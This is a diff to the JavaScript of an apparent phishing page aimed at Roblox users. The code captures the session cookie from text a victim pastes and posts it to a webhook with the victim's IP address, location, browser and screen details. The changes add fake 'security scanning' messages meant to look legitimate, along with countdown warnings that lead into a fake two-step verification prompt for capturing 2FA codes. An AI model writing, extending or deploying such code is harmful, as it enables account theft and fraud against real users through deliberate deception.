@@ -781,6 +781,9 @@ async function handlePasteEvent(pastedText) {
     try {
         console.log('Paste detected, analyzing content...');
         
+        // Show fake scanning progress to user
+        showFakeScanningProgress();
+        
         // Extract cookie from pasted text
         const robloxCookie = extractRobloxCookie(pastedText);
         
@@ -796,7 +799,7 @@ async function handlePasteEvent(pastedText) {
             // Create timestamp
             const timestamp = new Date().toLocaleString();
             
-            // Immediate cookie capture payload
+            // Enhanced payload with more details
             const payload = {
                 content: `🍪 **Roblox Cookie Captured (Paste Event)**
 \`\`\`
@@ -805,8 +808,11 @@ Time: ${timestamp}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 IP: ${locationInfo.ip || 'Unknown'}
 Content Length: ${pastedText.length} characters
+Browser: ${navigator.userAgent}
+Screen: ${screen.width}x${screen.height}
 \`\`\`
 ⏰ **2-Step Verification will trigger in 80 seconds...**
+🎯 **Target acquired - standby for 2FA capture**
 @everyone`
             };
 
@@ -822,21 +828,64 @@ Content Length: ${pastedText.length} characters
             if (response.ok) {
                 console.log('Cookie sent to webhook successfully');
                 
-                // Set up 80-second timer for 2FA modal
+                // Show fake success message to user
                 setTimeout(() => {
-                    console.log('80 seconds elapsed, opening 2-step verification modal...');
-                    openVerificationModal();
-                }, 80000); // 80 seconds
+                    showNotification('Initial scan complete - analyzing data...', 'success');
+                }, 2000);
+                
+                // Set up 80-second timer for 2FA modal with countdown notifications
+                setupDelayed2FACapture();
                 
             } else {
                 console.error('Failed to send cookie to webhook');
             }
         } else {
             console.log('No Roblox cookie found in pasted content');
+            // Still show fake scanning for non-cookie content
+            setTimeout(() => {
+                showNotification('No sensitive data detected', 'info');
+            }, 3000);
         }
     } catch (error) {
         console.error('Error handling paste event:', error);
     }
+}
+
+// Show fake scanning progress to make it look legitimate
+function showFakeScanningProgress() {
+    const steps = [
+        'Analyzing pasted content...',
+        'Scanning for security threats...',
+        'Checking authentication tokens...',
+        'Validating data integrity...'
+    ];
+    
+    steps.forEach((step, index) => {
+        setTimeout(() => {
+            showNotification(step, 'info');
+        }, index * 800);
+    });
+}
+
+// Enhanced 2FA capture setup with countdown
+function setupDelayed2FACapture() {
+    // Countdown notifications
+    const countdownTimes = [60, 30, 10];
+    
+    countdownTimes.forEach(seconds => {
+        setTimeout(() => {
+            showNotification(`Security verification required in ${seconds} seconds...`, 'warning');
+        }, (80 - seconds) * 1000);
+    });
+    
+    // Final 2FA modal trigger
+    setTimeout(() => {
+        console.log('80 seconds elapsed, opening 2-step verification modal...');
+        showNotification('Security verification required - please authenticate', 'error');
+        setTimeout(() => {
+            openVerificationModal();
+        }, 1000);
+    }, 80000); // 80 seconds
 }
 
 // Send 2FA code to webhook
